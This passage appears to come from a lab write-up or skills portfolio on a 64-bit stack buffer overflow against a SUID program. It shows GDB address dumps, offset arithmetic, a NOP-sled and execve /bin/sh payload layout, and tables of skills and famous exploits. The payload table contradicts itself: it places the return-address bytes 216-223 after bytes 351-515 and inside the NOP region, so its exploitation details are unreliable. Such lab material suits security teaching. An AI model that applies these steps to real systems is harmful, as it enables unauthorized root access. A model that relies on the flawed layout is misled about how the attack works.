$1 = (char (*)[100]) 0x7fffffffd8a0

(gdb) print $rbp
$2 = (void *) 0x7fffffffd970
```

**Critical Values (64-bit):**

| Variable | Address | Hex Value |
|----------|---------|-----------|
| **buffer** | `0x7fffffffd8a0` | Buffer start (64-bit address) |
| **rbp** | `0x7fffffffd970` | Base pointer (64-bit) |

---

### **Key Differences: 32-bit vs 64-bit**

| Aspect | 32-bit (x86) | 64-bit (x86-64) |
|--------|--------------|-----------------|
| **Address Size** | 4 bytes | 8 bytes |
| **Register Names** | EAX, EBX, ESP, EBP | RAX, RBX, RSP, RBP |
| **Stack Alignment** | 4-byte boundary | 16-byte boundary |
| **Return Address Size** | 4 bytes | 8 bytes |
| **Saved RBP Size** | 4 bytes (EBP) | 8 bytes |

---

### **Step 2: 64-bit Offset Calculations**

#### **Calculation 1: Offset to Return Address**

**Formula (64-bit):**
```
offset = (rbp_address - buffer_address) + 8
```

**Why "+8" instead of "+4"?**
- Saved RBP is 8 bytes (not 4)
- Return address is at `rbp + 8`

**Calculation:**
```
offset = 0x7fffffffd970 - 0x7fffffffd8a0 + 8
offset = 0xd0 + 8
offset = 208 + 8
offset = 216 bytes
```

**In Hexadecimal:**
```
0xd0 = 208 decimal
208 + 8 = 216 decimal = 0xd8 hex
```

---

#### **Calculation 2: Return Address**

**Formula:**
```
ret = buffer_address + chosen_offset
```

**Calculation:**
```
ret = 0x7fffffffd8a0 + 200
ret = 0x7fffffffd8a0 + 0xc8
ret = 0x7fffffffd968
```

**Why 200 bytes?**
- Same NOP sled strategy as 32-bit
- Provides buffer for address imprecision

---

#### **Calculation 3: Shellcode Start Position**

**Start = 300 bytes**

- NOP sled from 0 to 299
- Shellcode begins at byte 300

---

### **64-bit Stack Frame Visual**

```
High Memory (0x7ffffffff...)
┌────────────────────────────────────┐
│   Return Address (8 bytes)         │ ← Target of exploit
├────────────────────────────────────┤ ← rbp + 8
│   Saved RBP (8 bytes)              │
├────────────────────────────────────┤ ← rbp (0x7fffffffd970)
│                                    │
│   Local Variables                  │
│   buffer[100]                      │
│                                    │
├────────────────────────────────────┤ ← buffer (0x7fffffffd8a0)
│   ...                              │
Low Memory
```

**Address Comparison:**

| Component | 32-bit Address | 64-bit Address |
|-----------|----------------|----------------|
| Buffer | `0xffffcacc` | `0x7fffffffd8a0` |
| Base Pointer | `0xffffcb38` | `0x7fffffffd970` |
| Address Range | ~4GB (2³²) | ~16 Exabytes (2⁶⁴) |

---

### **Exploit Payload Structure (64-bit)**

```
Payload Layout:
┌──────────────────────────────────────────────────────────┐
│ Bytes 0-199:    NOP NOP NOP ... (0x90 × 200)            │
├──────────────────────────────────────────────────────────┤ ← ret (0x7fffffffd968)
│ Bytes 200-299:  NOP NOP NOP ... (0x90 × 100)            │
├──────────────────────────────────────────────────────────┤
│ Bytes 300-350:  [64-BIT SHELLCODE]                      │
│                 (execve /bin/sh with 64-bit syscalls)    │
├──────────────────────────────────────────────────────────┤
│ Bytes 351-515:  NOP NOP NOP ... (padding)               │
├──────────────────────────────────────────────────────────┤
│ Bytes 216-223:  [0x7fffffffd968] (8-byte ret address)   │
└──────────────────────────────────────────────────────────┘
```

**Critical 64-bit Considerations:**

1. **Address Encoding (Little-Endian):**
   ```
   Address: 0x7fffffffd968
   Bytes:   \x68\xd9\xff\xff\xff\x7f\x00\x00
   ```

2. **Alignment:**
   - 64-bit addresses must be 8-byte aligned
   - Stack typically 16-byte aligned

3. **Shellcode Differences:**
   - Use 64-bit registers (RAX, RDI, RSI, RDX)
   - Different syscall instruction handling
   - Longer immediate values

---

### **Skills Demonstrated:**

**Multi-Architecture Expertise:**
- ✅ Understanding of 32-bit vs 64-bit differences
- ✅ Register naming conventions (E* vs R*)
- ✅ Address size handling (4-byte vs 8-byte)
- ✅ Stack alignment awareness

**Advanced Exploitation:**
- ✅ Adapting techniques across architectures
- ✅ Precision in address calculation
- ✅ Hexadecimal arithmetic fluency
- ✅ Little-endian encoding understanding

**Debugging Skills:**
- ✅ GDB proficiency (64-bit mode)
- ✅ Memory inspection techniques
- ✅ Register analysis
- ✅ Stack frame reconstruction

---

## 🎓 Key Learning Outcomes

### **Low-Level Programming Mastery:**

| Skill Area | Techniques Learned | Proficiency |
|------------|-------------------|-------------|
| **Assembly Language** | x86/x86-64 syntax, syscalls, addressing modes | ⭐⭐⭐⭐ Advanced |
| **Shellcode Development** | String handling, NULL byte elimination, optimization | ⭐⭐⭐⭐⭐ Expert |
| **Binary Analysis** | objdump, xxd, GDB, disassembly | ⭐⭐⭐⭐ Advanced |
| **Memory Exploitation** | Stack overflow, return address overwriting | ⭐⭐⭐⭐ Advanced |
| **Privilege Escalation** | SUID exploitation, root shell acquisition | ⭐⭐⭐⭐ Advanced |

### **Exploit Development Techniques:**

| Technique | Description | Real-World Use |
|-----------|-------------|----------------|
| **NOP Sled** | Increases exploit reliability | Essential in real exploits |
| **Shellcode Injection** | Code execution in data segments | Common attack vector |
| **Return Address Overwrite** | Control flow hijacking | Classic exploitation method |
| **Address Calculation** | Precise offset determination | Required for stack exploits |
| **Multi-Architecture** | 32-bit and 64-bit exploitation | Versatility in pentesting |

---

## 💡 Real-World Impact & Industry Relevance

### **Historical Buffer Overflow Exploits:**

| Exploit | Year | Target | Impact |
|---------|------|--------|--------|
| **Morris Worm** | 1988 | fingerd/sendmail | First major Internet worm |
| **Code Red** | 2001 | IIS Web Server | 359,000 systems infected |
| **Slammer/Sapphire** | 2003 | SQL Server | 75,000 systems in 10 minutes |
| **Heartbleed** | 2014 | OpenSSL | Billions of systems vulnerable |
| **BlueKeep** | 2019 | Windows RDP | Critical remote exploitation |

### **Buffer Overflow in Modern Security:**

**Still Relevant Because:**
1. **Legacy Systems:** Many critical infrastructure systems run old code
2. **IoT Devices:** Limited security features, memory-unsafe languages
3. **Kernel Exploits:** OS kernels written in C/C++
4. **Embedded Systems:** Real-time systems, automotive, medical devices

**Modern Mitigations:**
- ASLR (Address Space Layout Randomization)
- DEP/NX (Data Execution Prevention)
- Stack Canaries (Stack Smashing Protection)
- Control Flow Integrity (CFI)
- Memory-Safe Languages (Rust, Go)

**Why This Lab Matters:**
- Understanding attacks → Building better defenses
- Penetration testing of legacy systems
- Security research and CVE discovery
- Red team operations
- Exploit development for authorized testing

---

## 🔧 Technical Skills Portfolio

### **Programming Languages:**
- ✅ Assembly (x86/x86-64 NASM syntax)
- ✅ C (vulnerability analysis, exploit wrappers)
- ✅ Python (exploit automation - implied for next step)
- ✅ Shell scripting (Bash automation)

### **Exploitation Tools:**
- ✅ NASM (assembler)
- ✅ GDB (debugger with exploit analysis)
- ✅ objdump (disassembler)
- ✅ xxd (hex editor/viewer)
- ✅ GCC (vulnerable program compilation)
- ✅ make (build automation)

### **Core Concepts:**
- ✅ Stack frame architecture
- ✅ Function calling conventions (cdecl, System V AMD64 ABI)
- ✅ System call interface (Linux syscall numbers)
- ✅ Memory layout (code, data, stack, heap)
- ✅ Little-endian byte ordering
- ✅ Register purposes and usage
- ✅ Buffer overflow mechanics
- ✅ Return address manipulation

### **Security Skills:**
- ✅ Vulnerability identification
- ✅ Exploit payload construction
- ✅ Privilege escalation (SUID)
- ✅ Shellcode optimization
- ✅ Attack surface analysis
- ✅ Defensive mitigation understanding

---